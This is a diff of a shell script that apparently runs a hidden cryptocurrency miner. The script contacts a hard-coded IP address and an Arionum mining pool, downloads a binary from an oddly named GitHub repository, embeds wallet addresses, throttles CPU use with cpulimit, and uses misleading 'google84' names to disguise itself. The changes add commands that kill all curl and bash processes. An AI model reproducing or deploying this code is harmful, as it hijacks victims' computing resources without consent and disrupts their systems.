@@ -19,13 +19,11 @@ google841212121274="http://mine.arionumpool.com"
 
 curl -s http://154.127.52.52/curlgoogle84.php
 
-pkill -f curl84
+pkill -f curl
 
 pkill -f curl84
 
-pkill -f curl84
-
-pkill -f curl84
+pkill -f bash
 
 wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
 
@@ -59,12 +57,6 @@ googlelinux8474=${linuxgoogle84%.*}
 
 pkill -f cpulimit
 
-pkill -f cpulimit
-
-pkill -f cpulimit
-
-pkill -f cpulimit
-
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
@@ -77,13 +69,11 @@ google841212121274="http://mine.arionumpool.com"
 
 curl -s http://154.127.52.52/curlgoogle84.php
 
-pkill -f curl84
+pkill -f curl
 
 pkill -f curl84
 
-pkill -f curl84
-
-pkill -f curl84
+pkill -f bash
 
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
@@ -111,12 +101,6 @@ count=$(echo "$google84121274 - 1884"|bc)
 googlelinux84=$(echo "$count / 524288"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
-
-pkill -f cpulimit
-
-pkill -f cpulimit
-
-pkill -f cpulimit
 
 pkill -f cpulimit
 
